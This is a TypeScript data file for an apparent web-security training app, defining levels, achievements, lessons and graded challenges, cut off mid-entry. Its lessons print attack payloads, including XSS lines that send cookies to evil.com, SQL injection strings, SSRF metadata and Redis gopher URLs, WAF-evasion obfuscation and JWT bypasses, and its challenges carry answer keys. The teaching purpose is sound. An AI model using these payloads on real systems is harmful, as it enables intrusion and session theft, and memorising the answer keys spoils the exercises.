import { create } from 'zustand'
import { persist } from 'zustand/middleware'

// ── Types ─────────────────────────────────────────────────────────────────────

export type AcademyLevel = 'Novice' | 'Apprentice' | 'Practitioner' | 'Expert' | 'Master'

export interface ChallengeHistoryEntry {
  id: string
  score: number
  time: number
  date: string
}

export interface Achievement {
  id: string
  name: string
  description: string
  icon: string
  unlocked: boolean
}

// ── Level thresholds ───────────────────────────────────────────────────────────

export const LEVEL_THRESHOLDS: Record<AcademyLevel, number> = {
  Novice:       0,
  Apprentice:   500,
  Practitioner: 2000,
  Expert:       5000,
  Master:       10000,
}

export const LEVEL_ORDER: AcademyLevel[] = ['Novice', 'Apprentice', 'Practitioner', 'Expert', 'Master']

export function getLevel(xp: number): AcademyLevel {
  let level: AcademyLevel = 'Novice'
  for (const l of LEVEL_ORDER) {
    if (xp >= LEVEL_THRESHOLDS[l]) level = l
  }
  return level
}

export function getNextLevel(xp: number): AcademyLevel | null {
  const current = getLevel(xp)
  const idx = LEVEL_ORDER.indexOf(current)
  return idx < LEVEL_ORDER.length - 1 ? LEVEL_ORDER[idx + 1] : null
}

export function getLevelProgress(xp: number): number {
  const current = getLevel(xp)
  const next = getNextLevel(xp)
  if (!next) return 1
  const start = LEVEL_THRESHOLDS[current]
  const end = LEVEL_THRESHOLDS[next]
  return (xp - start) / (end - start)
}

// ── Achievement definitions ────────────────────────────────────────────────────

export const ACHIEVEMENT_DEFS: Omit<Achievement, 'unlocked'>[] = [
  { id: 'first-blood',    name: 'First Blood',    description: 'Complete your first challenge',           icon: '🩸' },
  { id: 'scholar',        name: 'Scholar',         description: 'Complete 5 lessons',                     icon: '📚' },
  { id: 'bookworm',       name: 'Bookworm',        description: 'Complete all 15 lessons',                icon: '🐛' },
  { id: 'bypass-artist',  name: 'Bypass Artist',   description: 'Complete all FORGE challenges',          icon: '🎭' },
  { id: 'encoder',        name: 'Encoder',         description: 'Complete all LABYRINTH challenges',      icon: '🔐' },
  { id: 'analyst',        name: 'Analyst',         description: 'Complete all ARMORY challenges',         icon: '🔬' },
  { id: 'pentester',      name: 'Pentester',       description: 'Complete all CRUCIBLE challenges',       icon: '⚔️' },
  { id: 'recon-pro',      name: 'Recon Pro',       description: 'Complete all RECON challenges',          icon: '🕵️' },
  { id: 'speed-demon',    name: 'Speed Demon',     description: 'Complete any challenge in under 30s',    icon: '⚡' },
  { id: 'master',         name: 'Master',          description: 'Reach Master level (10000 XP)',          icon: '👑' },
]

// ── Track & lesson/challenge definitions ─────────────────────────────────────

export type TrackId = 'forge' | 'armory' | 'crucible' | 'labyrinth' | 'recon'

export interface LessonDef {
  id: string
  trackId: TrackId
  title: string
  xpReward: number
  estimatedMins: number
  difficulty: 'beginner' | 'intermediate' | 'advanced'
  content: LessonSection[]
}

export interface LessonSection {
  type: 'heading' | 'paragraph' | 'code' | 'note' | 'interactive'
  text?: string
  label?: string
  interactiveType?: 'encode-base64' | 'url-encode' | 'xss-reflect' | 'sqli-builder'
}

export interface ChallengeDef {
  id: string
  trackId: TrackId
  title: string
  description: string
  xpReward: number
  difficulty: 1 | 2 | 3 | 4 | 5
  type: 'text' | 'waf-bypass' | 'encoding' | 'cvss' | 'cwe' | 'idor' | 'surface'
  answer: string | ((input: string) => boolean)
  hints: string[]
  filterRegex?: string
  targetOutput?: string
}

// ── Course content ─────────────────────────────────────────────────────────────

export const LESSONS: LessonDef[] = [
  // FORGE
  {
    id: 'forge-1', trackId: 'forge', title: 'What is XSS?',
    xpReward: 75, estimatedMins: 8, difficulty: 'beginner',
    content: [
      { type: 'heading', text: 'Cross-Site Scripting (XSS)' },
      { type: 'paragraph', text: 'XSS occurs when an attacker injects malicious scripts into content viewed by other users. The browser executes the script in the context of the vulnerable page, giving the attacker access to cookies, session tokens, and DOM data.' },
      { type: 'heading', text: 'Reflected XSS' },
      { type: 'paragraph', text: 'The payload is reflected in the server response immediately. The victim must be tricked into clicking a crafted link. The malicious script is not stored — it travels in the URL parameter.' },
      { type: 'code', text: 'https://victim.com/search?q=<script>document.location="https://evil.com/steal?c="+document.cookie</script>' },
      { type: 'heading', text: 'Stored XSS' },
      { type: 'paragraph', text: 'The payload is persisted in the database (e.g., a comment field) and served to every user who views the content. This is far more dangerous as it requires no user interaction beyond visiting the page.' },
      { type: 'code', text: '<!-- Comment submitted to blog post -->\n<img src=x onerror="fetch(\'https://evil.com/?\'+document.cookie)">' },
      { type: 'heading', text: 'DOM-based XSS' },
      { type: 'paragraph', text: 'The payload is processed by client-side JavaScript. The server response is benign — the vulnerability lives entirely in the JS that reads from sources like location.hash or document.referrer.' },
      { type: 'code', text: '// Vulnerable code:\ndocument.getElementById("output").innerHTML = location.hash.slice(1);\n\n// Exploit URL:\nhttps://victim.com/page#<img src=x onerror=alert(1)>' },
      { type: 'note', text: 'Key takeaway: always encode output. Use textContent instead of innerHTML. Implement a strict Content Security Policy.' },
      { type: 'interactive', label: 'Try it: Enter a string and see it HTML-encoded', interactiveType: 'xss-reflect' },
    ],
  },
  {
    id: 'forge-2', trackId: 'forge', title: 'SQL Injection Basics',
    xpReward: 100, estimatedMins: 12, difficulty: 'intermediate',
    content: [
      { type: 'heading', text: 'SQL Injection' },
      { type: 'paragraph', text: 'SQL injection occurs when user-supplied data is incorporated into a SQL query without proper sanitization. The attacker can manipulate the query logic to bypass authentication, exfiltrate data, or even execute OS commands on some databases.' },
      { type: 'heading', text: 'UNION-based Injection' },
      { type: 'paragraph', text: 'UNION SELECT appends a second result set to the original query. You must match the number of columns and compatible data types.' },
      { type: 'code', text: "-- Find number of columns:\n' ORDER BY 1--\n' ORDER BY 2--\n-- Keep incrementing until error\n\n-- Extract data:\n' UNION SELECT username, password, NULL FROM users--" },
      { type: 'heading', text: 'Blind SQLi' },
      { type: 'paragraph', text: 'When the application does not display query results, use boolean-based or time-based blind injection to infer data one bit at a time.' },
      { type: 'code', text: "-- Boolean-based (does first char of username = 'a'?):\n' AND SUBSTRING(username,1,1)='a'--\n\n-- Time-based (delays 5s if true):\n'; IF (1=1) WAITFOR DELAY '0:0:5'--" },
      { type: 'heading', text: 'Error-based Injection' },
      { type: 'paragraph', text: 'Some databases leak data in error messages. ExtractValue on MySQL will cause an XPath error containing the injected expression result.' },
      { type: 'code', text: "' AND ExtractValue(1, CONCAT(0x7e, (SELECT version())))--" },
      { type: 'note', text: 'Defense: parameterized queries (prepared statements). Never concatenate user input into SQL.' },
      { type: 'interactive', label: 'Try it: Modify the username field and watch the SQL query change', interactiveType: 'sqli-builder' },
    ],
  },
  {
    id: 'forge-3', trackId: 'forge', title: 'SSRF Explained',
    xpReward: 100, estimatedMins: 10, difficulty: 'intermediate',
    content: [
      { type: 'heading', text: 'Server-Side Request Forgery' },
      { type: 'paragraph', text: 'SSRF tricks the server into making HTTP requests on behalf of the attacker. The server acts as a proxy to reach internal services, cloud metadata APIs, and localhost endpoints that are not externally accessible.' },
      { type: 'heading', text: 'Cloud Metadata Endpoints' },
      { type: 'paragraph', text: 'Cloud providers expose metadata at well-known link-local addresses. Obtaining instance credentials from these endpoints can lead to full cloud account compromise.' },
      { type: 'code', text: '# AWS IMDSv1 (no auth required):\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\n\n# GCP:\nhttp://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\n\n# Azure:\nhttp://169.254.169.254/metadata/instance?api-version=2021-02-01' },
      { type: 'heading', text: 'Internal Service Access' },
      { type: 'paragraph', text: 'SSRF can enumerate and exploit services on the internal network: Redis, Elasticsearch, internal admin panels, and databases.' },
      { type: 'code', text: '# Hit internal Redis (dict:// or gopher://):\ngopher://127.0.0.1:6379/_FLUSHALL\n\n# Internal admin panel:\nhttp://localhost:8080/admin/users' },
      { type: 'heading', text: 'Bypass Techniques' },
      { type: 'code', text: '# IP obfuscation:\nhttp://0177.0.0.1/          (octal)\nhttp://0x7f000001/          (hex)\nhttp://2130706433/          (decimal)\n\n# DNS rebinding, redirects, and IPv6: ::1' },
      { type: 'note', text: 'Mitigate with allowlist-based URL validation and blocking link-local ranges at the firewall level.' },
    ],
  },
  // ARMORY
  {
    id: 'armory-1', trackId: 'armory', title: 'OWASP Top 10 Overview',
    xpReward: 75, estimatedMins: 10, difficulty: 'beginner',
    content: [
      { type: 'heading', text: 'OWASP Top 10 (2021)' },
      { type: 'paragraph', text: 'The OWASP Top 10 is the canonical reference for web application security risk categories, updated periodically based on real-world data from hundreds of organizations.' },
      { type: 'code', text: 'A01 - Broken Access Control\nA02 - Cryptographic Failures\nA03 - Injection\nA04 - Insecure Design\nA05 - Security Misconfiguration\nA06 - Vulnerable & Outdated Components\nA07 - Identification & Authentication Failures\nA08 - Software & Data Integrity Failures\nA09 - Security Logging & Monitoring Failures\nA10 - Server-Side Request Forgery (SSRF)' },
      { type: 'heading', text: 'A01: Broken Access Control' },
      { type: 'paragraph', text: 'The #1 category. Includes IDOR, privilege escalation, missing authorization checks, and CORS misconfigurations. 94% of tested apps had some form of broken access control.' },
      { type: 'heading', text: 'A03: Injection' },
      { type: 'paragraph', text: 'Covers SQL, NoSQL, OS command, LDAP, and template injection. Wherever user data is interpreted as code or a command, injection is possible without proper sanitization.' },
      { type: 'note', text: 'Bug bounty tip: A01 and A03 together account for the majority of high/critical findings on public programs.' },
      { type: 'interactive', label: 'Try it: URL-encode your findings / payloads as you learn', interactiveType: 'url-encode' },
    ],
  },
  {
    id: 'armory-2', trackId: 'armory', title: 'CVSS Scoring Explained',
    xpReward: 100, estimatedMins: 12, difficulty: 'intermediate',
    content: [
      { type: 'heading', text: 'Common Vulnerability Scoring System v3.1' },
      { type: 'paragraph', text: 'CVSS provides a standardized way to capture the principal characteristics of a vulnerability and produce a numerical score (0.0–10.0) reflecting its severity.' },
      { type: 'heading', text: 'Base Score Metrics' },
      { type: 'code', text: 'Attack Vector (AV):     Network / Adjacent / Local / Physical\nAttack Complexity (AC): Low / High\nPrivs Required (PR):    None / Low / High\nUser Interaction (UI):  None / Required\nScope (S):              Unchanged / Changed\nConfidentiality (C):    None / Low / High\nIntegrity (I):          None / Low / High\nAvailability (A):       None / Low / High' },
      { type: 'heading', text: 'Score Ranges' },
      { type: 'code', text: '0.0       = None\n0.1–3.9   = Low\n4.0–6.9   = Medium\n7.0–8.9   = High\n9.0–10.0  = Critical' },
      { type: 'heading', text: 'Example: Unauthenticated RCE' },
      { type: 'paragraph', text: 'AV:N / AC:L / PR:N / UI:N / S:C / C:H / I:H / A:H → CVSS 10.0 (Critical). Network exploitable, no complexity, no auth, full impact.' },
      { type: 'note', text: 'Always include temporal and environmental metrics when reporting. The base score is the theoretical max.' },
    ],
  },
  {
    id: 'armory-3', trackId: 'armory', title: 'Writing Good Bug Reports',
    xpReward: 75, estimatedMins: 8, difficulty: 'beginner',
    content: [
      { type: 'heading', text: 'Anatomy of a Strong Bug Report' },
      { type: 'paragraph', text: 'A great bug report gets triaged faster, rated higher, and builds your reputation. Triage teams process hundreds of reports — make yours stand out by being clear, complete, and reproducible.' },
      { type: 'heading', text: 'Required Sections' },
      { type: 'code', text: '## Summary\nOne paragraph: what, where, impact.\n\n## Steps to Reproduce\n1. Navigate to https://target.com/endpoint?param=VALUE\n2. Observe the response...\n\n## Proof of Concept\n[Screenshot / Video / curl command]\n\n## Impact\nWhat can an attacker do? Include realistic attack scenario.\n\n## Remediation\nRecommended fix (sanitize input, add CSP header, etc.)' },
      { type: 'heading', text: 'Common Mistakes' },
      { type: 'paragraph', text: 'Vague impact statements ("attacker could do bad things"), missing PoC, steps that assume context the triager does not have, and overrating severity without justification all lead to delayed resolution or N/A.' },
      { type: 'note', text: 'Tip: Always test on your own account and staging environments first. Document environmental details (browser, OS, account type).' },
    ],
  },
  // CRUCIBLE
  {
    id: 'crucible-1', trackId: 'crucible', title: 'HTTP Methods & Headers',
    xpReward: 75, estimatedMins: 8, difficulty: 'beginner',
    content: [
      { type: 'heading', text: 'HTTP in Depth' },
      { type: 'paragraph', text: 'Understanding HTTP is fundamental to web security testing. Every vulnerability is mediated through HTTP — knowing request structure, methods, and critical headers lets you manipulate application behavior.' },
      { type: 'heading', text: 'Methods' },
      { type: 'code', text: 'GET    - Retrieve resource (no body, idempotent)\nPOST   - Submit data (body, non-idempotent)\nPUT    - Replace resource entirely\nPATCH  - Partial update\nDELETE - Remove resource\nHEAD   - Like GET but no response body\nOPTIONS- Allowed methods (CORS preflight)\nTRACE  - Echo request (XST attacks)' },
      { type: 'heading', text: 'Security-Critical Headers' },
      { type: 'code', text: 'Content-Security-Policy: default-src \'self\'\nX-Frame-Options: DENY\nStrict-Transport-Security: max-age=31536000; includeSubDomains\nX-Content-Type-Options: nosniff\nAccess-Control-Allow-Origin: https://trusted.com\nAuthorization: Bearer <token>\nCookie: session=abc123; Secure; HttpOnly; SameSite=Strict' },
      { type: 'note', text: 'Test: send unexpected methods (DELETE on GET-only endpoints). Check CORS with Origin: https://evil.com. Look for missing security headers.' },
      { type: 'interactive', label: 'Try it: Base64-encode your test tokens or headers', interactiveType: 'encode-base64' },
    ],
  },
  {
    id: 'crucible-2', trackId: 'crucible', title: 'Authentication Tokens & Sessions',
    xpReward: 100, estimatedMins: 12, difficulty: 'intermediate',
    content: [
      { type: 'heading', text: 'Session Management' },
      { type: 'paragraph', text: 'After login, the server must track the authenticated user. Weak session management — predictable IDs, insecure storage, missing expiry — is a critical vulnerability class.' },
      { type: 'heading', text: 'JWT Structure' },
      { type: 'code', text: '// Header.Payload.Signature (base64url encoded)\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\n.eyJzdWIiOiIxMjM0IiwicHJpdiI6InVzZXIifQ\n.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\n\n// Attacks:\n// 1. alg:none — remove signature entirely\n// 2. RS256->HS256 — use public key as HMAC secret\n// 3. Weak secret — brute-force with hashcat' },
      { type: 'heading', text: 'OAuth 2.0 Pitfalls' },
      { type: 'paragraph', text: 'Open redirects in redirect_uri, CSRF on the authorization endpoint (missing state param), token leakage via Referer header, and implicit flow token exposure in URL fragments.' },
      { type: 'code', text: '// CSRF: attacker-controlled state links victim account\nhttps://auth.provider.com/oauth?response_type=code\n  &client_id=APP&redirect_uri=https://target.com/callback\n  &state=ATTACKER_CONTROLLED' },
      { type: 'note', text: 'Always check: HttpOnly & Secure flags on session cookies, token expiry, logout invalidation.' },
    ],
  },
  {
    id: 'crucible-3', trackId: 'crucible', title: 'API Testing Fundamentals',
    xpReward: 100, estimatedMins: 12, difficulty: 'intermediate',
    content: [
      { type: 'heading', text: 'Modern API Security Testing' },
      { type: 'paragraph', text: 'REST APIs are the attack surface of choice in bug bounties. JSON bodies, versioned endpoints, and complex authorization logic create ample opportunity for high-impact findings.' },
      { type: 'heading', text: 'Recon: Discover Endpoints' },
      { type: 'code', text: '# Find API routes from JS bundles:\nwaybackurls target.com | grep /api/\n\n# Common paths:\n/api/v1/users\n/api/v2/admin\n/swagger.json\n/.well-known/openapi.json\n/graphql' },
      { type: 'heading', text: 'IDOR Pattern' },
      { type: 'paragraph', text: 'Insecure Direct Object Reference: replace your own resource ID with another user\'s. Test numeric IDs (increment/decrement), UUIDs (predict or enumerate from other endpoints), and indirect references.' },
      { type: 'code', text: '# Your request:\nGET /api/v1/users/1337/profile\n\n# Change to another user:\nGET /api/v1/users/1/profile\nGET /api/v1/users/1338/profile' },
      { type: 'heading', text: 'Mass Assignment' },
      { type: 'paragraph', text: 'APIs that blindly bind request body to model objects may allow setting admin:true, role:admin, or balance:9999 by including extra fields.' },
      { type: 'note', text: 'Use Burp or CRUCIBLE to intercept requests, manipulate IDs and fields, and observe responses carefully.' },
    ],
  },
  // LABYRINTH
  {
    id: 'labyrinth-1', trackId: 'labyrinth', title: 'Encoding 101 — Base64, URL, HTML',
    xpReward: 75, estimatedMins: 8, difficulty: 'beginner',
    content: [
      { type: 'heading', text: 'Encoding vs Encryption' },
      { type: 'paragraph', text: 'Encoding transforms data into another representation for transport or storage — it is NOT security. Encryption requires a key. Encodings are trivially reversible by anyone with the spec.' },
      { type: 'heading', text: 'Base64' },
      { type: 'code', text: 'Input:  alert(1)\nBase64: YWxlcnQoMSk=\n\n// Used in: Authorization headers, data URIs, JWT payloads\n// Variants: base64url (replaces +/ with -_)' },
      { type: 'heading', text: 'URL Encoding' },
      { type: 'code', text: 'Input:  <script>alert(1)</script>\nURL:    %3Cscript%3Ealert%281%29%3C%2Fscript%3E\n\n// Space = %20 or +\n// Critical chars: < %3C  > %3E  " %22  \' %27  ( %28  ) %29' },
      { type: 'heading', text: 'HTML Entity Encoding' },
      { type: 'code', text: 'Input:  <script>alert(1)</script>\nHTML:   &lt;script&gt;alert(1)&lt;/script&gt;\n\n// Numeric: &#60; = <   &#62; = >\n// Hex:     &#x3C; = <   &#x3E; = >' },
      { type: 'interactive', label: 'Try it: Base64 encode your input', interactiveType: 'encode-base64' },
    ],
  },
  {
    id: 'labyrinth-2', trackId: 'labyrinth', title: 'Double Encoding & Nested Chains',
    xpReward: 100, estimatedMins: 10, difficulty: 'intermediate',
    content: [
      { type: 'heading', text: 'Why Chain Encodings?' },
      { type: 'paragraph', text: 'WAFs and input filters often decode only once. By encoding your payload multiple times, you can have the WAF decode the outer layer (seeing something benign) while the application decodes further layers (executing your payload).' },
      { type: 'heading', text: 'Double URL Encoding' },
      { type: 'code', text: '< in URL encoding:  %3C\n%3C URL encoded:    %253C\n\n// Application decodes %253C → %3C → <\n// WAF sees %253C, does not match <script> rule\n\n// Real example:\nhttps://target.com/page?q=%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E' },
      { type: 'heading', text: 'Mixed Chains' },
      { type: 'code', text: '// Base64 wrapping URL-encoded payload:\nbtoa(encodeURIComponent(\'<script>alert(1)</script>\'))\n→ JTNDc2NyaXB0JTNFYWxlcnQoMSklM0Mvc2NyaXB0JTNF\n\n// HTML entity inside attribute:\n<img onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;" src=x>' },
      { type: 'note', text: 'Use LABYRINTH\'s chain builder to compose and test encoding sequences interactively.' },
    ],
  },
  {
    id: 'labyrinth-3', trackId: 'labyrinth', title: 'WAF Evasion Techniques',
    xpReward: 125, estimatedMins: 15, difficulty: 'advanced',
    content: [
      { type: 'heading', text: 'Understanding WAF Detection' },
      { type: 'paragraph', text: 'Web Application Firewalls use signature matching, behavioral analysis, and ML to detect attacks. Evasion focuses on making your payload not match known signatures while preserving functionality.' },
      { type: 'heading', text: 'Case Variation & Whitespace' },
      { type: 'code', text: '// Blocked:\n<script>alert(1)</script>\n\n// Bypass:\n<ScRiPt>alert(1)</sCrIpT>\n<script   >alert(1)</script>\n<script/xss>alert(1)</script>' },
      { type: 'heading', text: 'Alternative Event Handlers' },
      { type: 'code', text: '// script tag blocked? Use event handlers:\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n<body onpageshow=alert(1)>\n<details open ontoggle=alert(1)>\n<video><source onerror=alert(1)>' },
      { type: 'heading', text: 'Obfuscation' },
      { type: 'code', text: '// String splitting:\neval(\'al\'+\'ert(1)\')\n\n// Bracket notation:\nwindow[\'al\'+(\'ert\')]((1))\n\n// Unicode escapes:\n\\u0061\\u006c\\u0065\\u0072\\u0074(1)\n\n// JSFuck (0 chars):\n[][(![]+[])[+[]]+(![]+[...]' },
      { type: 'note', text: 'Context matters: an XSS in an HTML attribute needs different evasion than one in a script block or JSON response.' },
    ],
  },
  // RECON
  {
    id: 'recon-1', trackId: 'recon', title: 'Subdomain Enumeration Methodology',
    xpReward: 75, estimatedMins: 10, difficulty: 'beginner',
    content: [
      { type: 'heading', text: 'Why Subdomain Enumeration?' },
      { type: 'paragraph', text: 'Subdomains often host forgotten staging environments, internal tools, legacy apps, and third-party integrations with weaker security posture than the main domain. The more surface you find, the more opportunities for critical bugs.' },
      { type: 'heading', text: 'Passive Techniques' },
      { type: 'code', text: '# Certificate transparency logs:\ncurl "https://crt.sh/?q=%.target.com&output=json"\n\n# DNS brute with subfinder:\nsubfinder -d target.com -o subs.txt\n\n# Historical data:\nawsathena, securitytrails, chaos-data\n\n# Google dork:\nsite:*.target.com -www' },
      { type: 'heading', text: 'Active Techniques' },
      { type: 'code', text: '# DNS resolution with massdns:\nmassdns -r resolvers.txt -t A wordlist.txt target.com\n\n# Permutation expansion:\nalter.py subs.txt | massdns -r resolvers.txt\n\n# VHOST brute:\nffuf -w wordlist.txt -H "Host: FUZZ.target.com" -u https://target.com/' },
      { type: 'note', text: 'After enumeration: check for dangling CNAMEs (subdomain takeover), exposed panels, and default credentials.' },
      { type: 'interactive', label: 'Try it: URL-encode a subdomain or endpoint you discover', interactiveType: 'url-encode' },
    ],
  },
  {
    id: 'recon-2', trackId: 'recon', title: 'Port Scanning & Service Detection',
    xpReward: 100, estimatedMins: 10, difficulty: 'intermediate',
    content: [
      { type: 'heading', text: 'Nmap Essentials' },
      { type: 'paragraph', text: 'Port scanning identifies open TCP/UDP ports and running services. Service version detection and script scanning can immediately surface vulnerabilities without manual testing.' },
      { type: 'code', text: '# Fast full-port scan:\nnmap -p- --min-rate 5000 -T4 target.com\n\n# Service + version + default scripts:\nnmap -sV -sC -p 22,80,443,8080,8443 target.com\n\n# UDP scan (slower):\nnmap -sU -p 53,161,500 target.com\n\n# NSE vulnerability scan:\nnmap --script vuln target.com' },
      { type: 'heading', text: 'What to Look For' },
      { type: 'code', text: 'Port 22  (SSH)   → default creds, old version\nPort 21  (FTP)   → anonymous login, clear-text\nPort 80/443      → web app (run gobuster/ffuf)\nPort 8080/8443   → admin panels, dev servers\nPort 3306 (MySQL)→ exposed database\nPort 6379 (Redis)→ often unauthenticated\nPort 27017 (Mongo)→ often unauthenticated' },
      { type: 'note', text: 'In bug bounties, check if out-of-scope IPs share infrastructure with in-scope assets (same CDN, same ASN).' },
    ],
  },
  {
    id: 'recon-3', trackId: 'recon', title: 'Attack Surface Mapping',
    xpReward: 125, estimatedMins: 15, difficulty: 'advanced',
    content: [
      { type: 'heading', text: 'Building the Attack Graph' },
      { type: 'paragraph', text: 'Attack surface mapping is the process of cataloguing every entry point into a target system. A comprehensive map reveals high-value targets and guides efficient testing prioritization.' },
      { type: 'heading', text: 'Asset Discovery Framework' },
      { type: 'code', text: '1. Root domains + IP ranges (from scope, WHOIS, ASN)\n2. Subdomains (passive + active enumeration)\n3. Live hosts (HTTP probe with httpx)\n4. Technology fingerprinting (Wappalyzer, whatweb)\n5. Directory/file discovery (ffuf, feroxbuster)\n6. Parameter discovery (arjun, paramspider)\n7. JavaScript analysis (linkfinder, JSParser)\n8. API endpoint mapping (swagger, graphql introspection)' },
      { type: 'heading', text: 'Prioritization Matrix' },
      { type: 'paragraph', text: 'Rank targets by: authentication state required (unauthenticated > authenticated), data sensitivity (PII, payment, admin), third-party integrations (OAuth, payment processors), and age/technology (legacy apps often less hardened).' },
      { type: 'note', text: 'Document everything. A comprehensive attack surface map is the foundation of all systematic bug bounty work.' },
    ],
  },
]

export const CHALLENGES: ChallengeDef[] = [
  // FORGE
  {
    id: 'forge-c1', trackId: 'forge', title: 'Bypass the Alert Filter',
    description: 'The WAF blocks any payload containing the string `<script>`. Your goal: inject XSS that calls alert(1) without using a script tag. The input is reflected inside an HTML context without encoding.',
    xpReward: 150, difficulty: 3,
    type: 'waf-bypass',
    filterRegex: '<script',
    answer: (input: string) => {
      const lower = input.toLowerCase()
      return !lower.includes('<script') && /alert\s*\(/.test(lower)
    },
    hints: [
      'Think about HTML event handlers on image elements.',
      'The onerror attribute fires when an image fails to load.',
      'Try: <img src=x onerror=alert(1)>',
    ],
  },
  {
    id: 'forge-c2', trackId: 'forge', title: 'Extract the Database',
    description: 'A login endpoint reflects data back when the SQL query returns results. Write a UNION SELECT injection to extract username and password from the `users` table. The query selects 2 columns.',
    xpReward: 175, difficulty: 3,
    type: 'text',
    answer: (input: string) => {
      const norm = input.toLowerCase().replace(/\s+/g, ' ').trim()
      return norm.includes('union') && norm.includes('select') && norm.includes('username') && norm.includes('password') && norm.includes('users')
    },
    hints: [
      'UNION SELECT requires matching column count. The query uses 2 columns.',
      'Start with: \' UNION SELECT ...',
      'Answer: \' UNION SELECT username,password FROM users--',
    ],
  },
  // ARMORY
  {
    id: 'armory-c1', trackId: 'armory', title: 'Score This Vulnerability',
    description: 'A remote attacker with no authentication can send a crafted HTTP request to a public API endpoint and execute arbitrary OS commands on the server. No user interaction required. Full system compromise. Assign the CVSS 3.1 Base Score (0.0–10.0).',
    xpReward: 125, difficulty: 2,
    type: 'cvss',
    answer: (input: string) => {
      const score = parseFloat(input)
      return !isNaN(score) && score >= 9.0 && score <= 10.0
    },
    hints: [
      'AV:Network, AC:Low, PR:None, UI:None — that\'s already very high.',
      'Full C/I/A impact with changed scope pushes this to Critical range.',
      'The score should be between 9.0 and 10.0.',
    ],
  },
  {
    id: 'armory-c2', trackId: 'armory', title: 'Classify the CWE',
    description: 'A web application accepts a filename parameter and reads the file from the filesystem: `readFile("uploads/" + filename)`. An attacker passes `../../etc/passwd` and reads the file. What is the CWE number?',
    xpReward: 125, difficulty: 2,
    type: 'cwe',
    answer: (input: string) => {
      const clean = input.replace(/[^0-9]/g, '')
      return clean === '22'
    },
    hints: [
      'This attack allows reading files outside the intended directory.',
      'The vulnerability class is called "Path Traversal".',
      'CWE-22: Improper Limitation of a Pathname to a Restricted Directory.',
    ],
  },
  // CRUCIBLE
  {
    id: 'crucible-c1', trackId: 'crucible', title: 'Find the IDOR',
    description: 'Two API responses are shown below. User A gets their own data. What request should User A make to access User B\'s private notes?\n\nResponse A: {"userId":1042,"notes":"My private notes","email":"alice@example.com"}\nEndpoint A: GET /api/v1/users/1042/notes\n\nResponse B (different user, same structure, userId:1337)',
    xpReward: 125, difficulty: 2,
    type: 'idor',
    answer: (input: string) => {
      return input.includes('1337') && input.toLowerCase().includes('/api')
    },
    hints: [
      'IDOR means you change the resource identifier to another user\'s ID.',
      'The endpoint pattern is /api/v1/users/{userId}/notes',
      'Try: GET /api/v1/users/1337/notes',
    ],
  },
  {
    id: 'crucible-c2', trackId: 'crucible', title: 'Bypass the Auth',
    description: 'The API validates a JWT. The token header contains: {"alg":"HS256","typ":"JWT"}. The server uses the RSA public key for verification. What algorithm manipulation bypasses the signature check? Enter the algorithm value to use.',
    xpReward: 150, difficulty: 3,
    type: 'text',
    answer: (input: string) => {
      const clean = input.trim().toLowerCase().replace(/['"]/g, '')
      return clean === 'none' || clean === 'hs256'
    },
    hints: [
      'JWT supports an "alg":"none" value that disables signature verification.',
      'Alternatively: if server uses RS256 with public key, switch to HS256 and sign with the public key.',
      'Answer: none (or HS256 for the key confusion attack)',
    ],
  },
  // LABYRINTH
  {
    id: 'labyrinth-c1', trackId: 'labyrinth', title: 'Encode to Bypass',
    description: 'A WAF blocks payloads containing `<script>` and `alert`. Double-URL-encode the payload `<script>alert(1)</script>` so both filters are bypassed. Enter the fully encoded payload.',
    xpReward: 150, difficulty: 3,
    type: 'encoding',
    targetOutput: '%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E',
    answer: (input: string) => {
      const clean = input.trim().toLowerCase()
      return clean.includes('%25') && clean.includes('%3c') || clean.includes('%253c')
    },
    hints: [
      'URL encode once: < becomes %3C, > becomes %3E',
      'URL encode the % sign: % becomes %25, so %3C becomes %253C',
      'Double encoded < = %253C, > = %253E, ( = %2528, ) = %2529',
    ],
  },
  {
    id: 'labyrinth-c2', trackId: 'labyrinth', title: 'Decode the Mystery',
    description: 'You intercepted this string: `JTNDc2NyaXB0JTNFYWxlcnQoMSklM0Mvc2NyaXB0JTNF`\n\nDecode it to find the original payload. Enter the decoded string.',
    xpReward: 125, difficulty: 2,
    type: 'encoding',
    answer: (input: string) => {
      const clean = input.trim().toLowerCase().replace(/\s/g, '')
      return clean.includes('<script>') && clean.includes('alert') && clean.includes('</script>')
    },
    hints: [
      'The outer encoding looks like Base64 (A-Z, a-z, 0-9, +, /, =).',
      'After decoding base64 you\'ll get URL-encoded text.',
      'Chain: base64 decode → URL decode → <script>alert(1)</script>',
    ],
  },
  // RECON
  {
    id: 'recon-c1', trackId: 'recon', title: 'Map the Surface',
    description: 'Target: AcmeCorp. Scope: acme.com and *.acme.com.\n\nKnown info: main site on acme.com, a React SPA, login at /app/login, API documented at /api/v2/swagger.json, mobile app linking to api.acme.com, an acquired company staginglegacy.acme.com.\n\nList the attack vectors you would test (enter comma-separated, minimum 4).',
    xpReward: 125, difficulty: 2,
    type: 'surface',
    answer: (input: string) => {
      const lower = input.toLowerCase()
      const vectors = ['swagger', 'api', 'idor', 'auth', 'login', 'legacy', 'staging', 'subdomain', 'xss', 'sqli', 'jwt', 'ssrf', 'cors', 'mobile']
      const matches = vectors.filter(v => lower.includes(v))
      return matches.length >= 4
    },
    hints: [
      'Think about the Swagger docs — what do they expose?',
      'Legacy/acquired subdomains often have weaker security.',
      'API endpoints + mobile app = IDOR opportunities, auth bypass, CORS misconfig.',
    ],
  },
  {
    id: 'recon-c2', trackId: 'recon', title: 'Find the Hidden Subdomain',
    description: 'DNS records for acme.com:\n\nblog.acme.com      CNAME  acme.ghost.io\nshop.acme.com      CNAME  acme.myshopify.com\nstatus.acme.com    CNAME  acmestatus.statuspage.io\nlegacy.acme.com    CNAME  acme-legacy.s3-website-us-east-1.amazonaws.com\nnews.acme.com      CNAME  acmenews.wpengine.com\n\nOne of these is vulnerable to subdomain takeover because the CNAME target is unclaimed. Which subdomain? (Enter just the subdomain, e.g. "blog")',
    xpReward: 150, difficulty: 3,
    type: 'text',
    answer: (input: string) => {
      return input.trim().toLowerCase().replace('.acme.com', '') === 'legacy'
    },
    hints: [
      'Subdomain takeover occurs when the CNAME points to an unclaimed service.',
